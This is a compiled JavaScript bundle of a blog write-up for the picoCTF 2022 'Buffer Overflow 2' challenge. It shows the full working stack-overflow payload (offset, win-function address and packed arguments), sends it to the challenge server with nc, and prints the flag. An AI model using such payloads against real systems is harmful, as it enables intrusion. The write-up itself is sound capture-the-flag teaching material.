"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[24929],{507:(U,e,n)=>{n.r(e),n.d(e,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>s,metadata:()=>a,toc:()=>o});var t=n(74848),r=n(28453);const s={},i="Buffer Overflow 2",a={permalink:"/blog/pico_2022/binary_exploitation/buffer_overflow_2/README",source:"@site/blog/pico_2022/binary_exploitation/buffer_overflow_2/README.md",title:"Buffer Overflow 2",description:"Description",date:"2024-09-26T20:55:31.413Z",tags:[],readingTime:2.495,hasTruncateMarker:!1,authors:[],frontMatter:{},unlisted:!1,prevItem:{title:"Buffer Overflow 1",permalink:"/blog/pico_2022/binary_exploitation/buffer_overflow_1/README"},nextItem:{title:"Buffer Overflow 3",permalink:"/blog/pico_2022/binary_exploitation/buffer_overflow_3/README"}},c={authorsImageUrls:[]},o=[{value:"Description",id:"description",level:2},{value:"Exploitation",id:"exploitation",level:2}];function l(U){const e={a:"a",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,r.R)(),...U.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:"description",children:"Description"}),"\n",(0,t.jsx)(e.p,{children:"Control the return address and arguments."}),"\n",(0,t.jsxs)(e.p,{children:["This time you'll need to control the arguments to the function you return to! Can you get the flag from this ",(0,t.jsx)(e.a,{href:"https://artifacts.picoctf.net/c/344/vuln",children:"program"}),"?"]}),"\n",(0,t.jsxs)(e.p,{children:["You can view source ",(0,t.jsx)(e.a,{href:"https://artifacts.picoctf.net/c/344/vuln.c",children:"here"}),"."]}),"\n",(0,t.jsx)(e.p,{children:"And connect with it using"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"nc saturn.picoctf.net 50918\n"})}),"\n",(0,t.jsx)(e.h2,{id:"exploitation",children:"Exploitation"}),"\n",(0,t.jsxs)(e.p,{children:["After fuzzing, we can see that the segmentation fault is at address ",(0,t.jsx)(e.code,{children:"0x34333231"})," (the instructon pointer is pointing to that space in memory):"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"> cat <(python2 -c \"print('U' * 112 + '1234')\") | ./vuln\n\nPlease enter your string: \nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234\n[1]    285183 done                              cat <(python2 -c \"print('U' * 112 + '1234')\") | \n       285184 segmentation fault (core dumped)  ./vuln\n\n\n> dmesg | grep vuln | tail -1\n[207149.111460] vuln[285239]: segfault at 34333231 ip 0000000034333231 sp 00000000ffffca30 error 14 in libc-2.31.so[f7dc5000+19000]\n"})}),"\n",(0,t.jsxs)(e.p,{children:["Since we want to jump to implant the memory location where the ",(0,t.jsx)(e.code,{children:"win"})," function starts, we can use the following command to find the memory address and then convert it into little Endian so we can send it into the payload:"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"# Get memory address of win function\nWIN_MEM_LOCATION=0x`readelf -s vuln | grep win | cut -d\" \" -f6` # 08049296\n\npython3 -c \"import struct;print(struct.pack('<I', $WIN_MEM_LOCATION))\"\nb'\\x96\\x92\\x04\\x08'\n"})}),"\n",(0,t.jsxs)(e.p,{children:["Adding the ",(0,t.jsx)(e.code,{children:"win"})," address into the payload, we can see that the ",(0,t.jsx)(e.code,{children:"win"})," function is actually called:"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"cat <(python2 -c \"print('U' * 112 + '\\x96\\x92\\x04\\x08')\") | ./vuln\nPlease enter your string: \nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\nPlease create 'flag.txt' in this directory with your own debugging flag.\n"})}),"\n",(0,t.jsx)(e.p,{children:"Let's create the flag locally and try again to see what happens:"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"\u276f cat <(python2 -c \"print('U' * 112 + '\\x96\\x92\\x04\\x08')\") | ./vuln\n\nPlease enter your string: \nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\n[1]    286421 done                              cat <(python2 -c \"print('U' * 112 + '\\x96\\x92\\x04\\x08')\") | \n       286422 segmentation fault (core dumped)  ./vuln\n\n\u276f dmesg | grep vuln | tail -1\n\n[208481.875568] vuln[286422]: segfault at 0 ip 0000000000000000 sp 00000000ffffca34 error 14 in vuln[8048000+1000]\n"})}),"\n",(0,t.jsxs)(e.p,{children:["This time it crashes because we didn't supply a return address to the ",(0,t.jsx)(e.code,{children:"win"})," function. 4 bytes after the ",(0,t.jsx)(e.code,{children:"EBP"})," is the ",(0,t.jsx)(e.code,{children:"RET"})," address. 4 bytes after that is the first argument and another 4 bytes after that is the second argument."]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://i.stack.imgur.com/w19l1.png",alt:""})}),"\n",(0,t.jsxs)(e.p,{children:["Since in this case we don't really care about the return address, we can put anything in there. If we review the source code for the ",(0,t.jsx)(e.code,{children:"win"})," function, we can see that it's expecting 2 arguments:"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-c",children:"if (arg1 != 0xCAFEF00D)\n    return;\nif (arg2 != 0xF00DF00D)\n    return;\n"})}),"\n",(0,t.jsx)(e.p,{children:"So let's convert these memory addresses into little Endian as well:"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-python",children:"struct.pack('<I', 0xCAFEF00D)\nb'\\r\\xf0\\xfe\\xca'\n\nstruct.pack('<I', 0xF00DF00D)\nb'\\r\\xf0\\r\\xf0'\n"})}),"\n",(0,t.jsx)(e.p,{children:"And them to the payload after the fuzzed return address to get the flag:"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"> cat <(python2 -c \"print('U' * 112 + '\\x96\\x92\\x04\\x08' + 'UUUU' '\\r\\xf0\\xfe\\xca' + '\\r\\xf0\\r\\xf0')\") | ./vuln\n\nPlease enter your string: \nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\npicoCTF{some_flag}\n[1]    285206 done                              cat  | \n       285207 segmentation fault (core dumped)  ./vuln\n"})}),"\n",(0,t.jsx)(e.p,{children:"And on the remote server:"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:" cat <(python2 -c \"print('U' * 112 + '\\x96\\x92\\x04\\x08' + 'UUUU' '\\r\\xf0\\xfe\\xca' + '\\r\\xf0\\r\\xf0')\") | nc saturn.picoctf.net 57551\nPlease enter your string: \nUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\npicoCTF{argum3nt5_4_d4yZ_b3fd8f66}\n"})})]})}function d(U={}){const{wrapper:e}={...(0,r.R)(),...U.components};return e?(0,t.jsx)(e,{...U,children:(0,t.jsx)(l,{...U})}):l(U)}},28453:(U,e,n)=>{n.d(e,{R:()=>i,x:()=>a});var t=n(96540);const r={},s=t.createContext(r);function i(U){const e=t.useContext(s);return t.useMemo((function(){return"function"==typeof U?U(e):{...e,...U}}),[e,U])}function a(U){let e;return e=U.disableParentContext?"function"==typeof U.components?U.components(r):U.components||r:i(U.components),t.createElement(s.Provider,{value:e},U.children)}}}]);